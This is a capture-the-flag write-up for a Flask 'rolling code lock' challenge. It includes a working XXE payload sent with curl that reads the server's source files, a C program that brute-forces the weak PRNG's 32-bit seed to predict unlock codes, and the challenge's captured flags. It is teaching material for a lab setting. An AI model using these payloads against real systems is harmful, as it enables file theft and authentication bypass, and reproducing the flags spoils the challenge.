# Model E1337 Rolling Code Lock — Writeup (2/2 flags)

**Difficulty:** Hard | **Category:** Web + Crypto | **Points:** ~13

## Challenge Overview

**Context:** A Flask application simulating a "rolling code lock". Accepts XML configuration via `/set-config` and validates numeric codes at `/unlock`. The correct code changes on every attempt using a custom PRNG fed by a 32-bit seed.

**What you face:** A lock that only opens with the right code, which changes constantly. To open it, you need to: (1) read the source code via XXE to understand the PRNG, and (2) recover the seed by observing PRNG outputs to predict the next code.

**Vulnerabilities exploited:**
- XXE (CWE-611) — `/set-config` processes XML with external entities; exfiltrates `main.py` and `rng.py`
- Weak PRNG / Seed Recovery (CWE-338) — 32-bit seed = ~4B possibilities, recoverable via Z3 or GF(2)

**What you learn:**
- XXE as a source code exfiltration vector — not just SSRF
- Custom PRNGs are dangerous: mathematical invariants allow recovering the seed
- Z3 SMT solver for solving equations over PRNG bits
- GF(2) (linear algebra over binary field) as a more efficient alternative to Z3
- Real rolling codes (like hardware OTP) use cryptographically secure PRNGs precisely to prevent this

---

## Summary

Flask app with two attack vectors:
- Flag 1: XXE on the `/set-config` endpoint to read source code
- Flag 2: Brute-force of 32-bit seed of a custom PRNG to predict the "rolling code"

## Flag 1 — XXE

### Reconnaissance

```
/        → Lock/Unlock form (unlock code)
/admin   → Admin panel commented: "We should be using get-config on the client side."
/get-config  → XML with current location
/set-config?data=<XML>  → SAX parser without protection against XXE
```

### Exploit

`/set-config?data=<XML>` processes XML with `xml.sax` without disabling external entities.

Reading `main.py` (contains the flag in a comment):

```bash
BASE="https://<instance>.ctf.hacker101.com"

# XXE payload to read main.py
python3 -c "
import urllib.parse
xxe = 'main.py'
payload = '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"' + xxe + '\">]><config><location>&xxe;</location></config>'
print(urllib.parse.quote(payload, safe=''))
" | xargs -I{} curl -sk "${BASE}/set-config?data={}" > /dev/null

curl -sk "${BASE}/get-config"
# Returns the content of main.py inside <location>...</location>
```

**Flag 1:** `2b1328627ef15269d3c0d5f26da6399c31dfd4f471f0b0fd73765f8c374bcafc`

### Why it works

The SAX handler reads the entity `&xxe;` content via `SYSTEM "main.py"` (relative path to the application's CWD), stores it in the global variable `location`, and `/get-config` exposes it back.

---

## Flag 2 — Custom PRNG brute-force

### Reading rng.py via XXE

```python
# rng.py (read via XXE with SYSTEM "rng.py")
import random

def setup(seed):
    global state
    state = 0
    for i in xrange(16):  # Python 2
        cur = seed & 3
        seed >>= 2
        state = (state << 4) | ((state & 3) ^ cur)
        state |= cur << 2

def next(bits):
    global state
    ret = 0
    for i in xrange(bits):
        ret <<= 1
        ret |= state & 1
        state = (state << 1) ^ (state >> 61)
        state &= 0xFFFFFFFFFFFFFFFF
        state ^= 0xFFFFFFFFFFFFFFFF
        for j in xrange(0, 64, 4):
            cur = (state >> j) & 0xF
            cur = (cur >> 3) | ((cur >> 2) & 2) | ((cur << 3) & 8) | ((cur << 2) & 4)
            state ^= cur << j
    return ret

setup((random.randrange(0x10000) << 16) | random.randrange(0x10000))
```

### Analyzing /unlock

```python
@app.route('/unlock', methods=['POST'])
def unlock():
    code = int(request.form['code'])
    cur = next(26)          # Advances state and generates a 26-bit code
    time.sleep(5)
    if code == cur:
        return 'Unlocked successfully.  Flag: ' + flags[1]
    else:
        return 'Code incorrect.  Expected %08i' % cur  # Reveals the current code!
```

Sending a wrong code causes the server to return the expected code, revealing the PRNG output.

### Attack strategy

1. Send two wrong requests to obtain consecutive V_n and V_{n+1}
2. Brute-force all 2^32 possible seeds looking for the seed that produces V_n followed by V_{n+1}
3. Calculate V_{n+2} and submit it

```bash
# Probe to get V_n and V_{n+1}
curl -s -X POST "$BASE/unlock" -d "code=0"
# Code incorrect.  Expected 08271727
curl -s -X POST "$BASE/unlock" -d "code=0"
# Code incorrect.  Expected 30427920
```

### Brute-force in C (4 parallel processes)

```c
// rng_brute.c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

static uint64_t state;

static inline void setup(uint32_t seed) {
    state = 0;
    for (int i = 0; i < 16; i++) {
        uint64_t cur = seed & 3;
        seed >>= 2;
        state = (state << 4) | ((state & 3) ^ cur);
        state |= cur << 2;
    }
}

static inline uint32_t next_val(int bits) {
    uint32_t ret = 0;
    for (int i = 0; i < bits; i++) {
        ret <<= 1;
        ret |= state & 1;
        state = (state << 1) ^ (state >> 61);
        state &= 0xFFFFFFFFFFFFFFFFULL;
        state ^= 0xFFFFFFFFFFFFFFFFULL;
        for (int j = 0; j < 64; j += 4) {
            uint64_t cur = (state >> j) & 0xF;
            cur = (cur >> 3) | ((cur >> 2) & 2) | ((cur << 3) & 8) | ((cur << 2) & 4);
            state ^= cur << j;
        }
    }
    return ret;
}

int main(int argc, char *argv[]) {
    uint32_t t1 = (uint32_t)atol(argv[1]);
    uint32_t t2 = (uint32_t)atol(argv[2]);
    uint64_t start = (uint64_t)atoll(argv[3]);
    uint64_t end   = (uint64_t)atoll(argv[4]);
    
    for (uint64_t seed = start; seed < end; seed++) {
        setup((uint32_t)seed);
        uint32_t v1 = next_val(26);
        if (v1 != t1) continue;
        uint32_t v2 = next_val(26);
        if (v2 != t2) continue;
        uint32_t v3 = next_val(26);
        printf("FOUND seed=%llu V1=%u V2=%u SUBMIT=%u\n", 
               (unsigned long long)seed, v1, v2, v3);
        return 0;
    }
    return 1;
}
```

```bash
# Compile and run in parallel
gcc -O3 -march=native -o rng_brute rng_brute.c

T1=8271727   # V_n
T2=30427920  # V_{n+1}
Q=1073741824  # 2^32 / 4

./rng_brute $T1 $T2 0 $Q &
./rng_brute $T1 $T2 $Q $((Q*2)) &
./rng_brute $T1 $T2 $((Q*2)) $((Q*3)) &
./rng_brute $T1 $T2 $((Q*3)) 4294967296 &
wait
# FOUND seed=2906009878 V1=8271727 V2=30427920 SUBMIT=47054530
```

### Submission

```bash
curl -s -X POST "$BASE/unlock" -d "code=47054530"
# Unlocked successfully.  Flag: ^FLAG^4ff2149705fa751ebc7c839884a4d0d9dc25c4ce8407d44ae8500cabb9c68684$FLAG$
```

**Flag 2:** `4ff2149705fa751ebc7c839884a4d0d9dc25c4ce8407d44ae8500cabb9c68684`

---

## Flags

| # | Flag | Method |
|---|------|--------|
| 1 | `2b1328627ef15269d3c0d5f26da6399c31dfd4f471f0b0fd73765f8c374bcafc` | XXE on /set-config |
| 2 | `4ff2149705fa751ebc7c839884a4d0d9dc25c4ce8407d44ae8500cabb9c68684` | PRNG brute-force |

## Lessons Learned

1. XML SAX without `parser.setFeature(xml.sax.handler.feature_external_ges, False)` is vulnerable to XXE
2. Endpoints that reveal the "expected code" in error messages eliminate the PRNG's advantage
3. A 32-bit seed is brute-forceable in ~7 minutes with C+OpenMP/parallel on CPU
4. Two consecutive PRNG outputs are sufficient to uniquely identify the seed (2 constraints for 2^32 space)
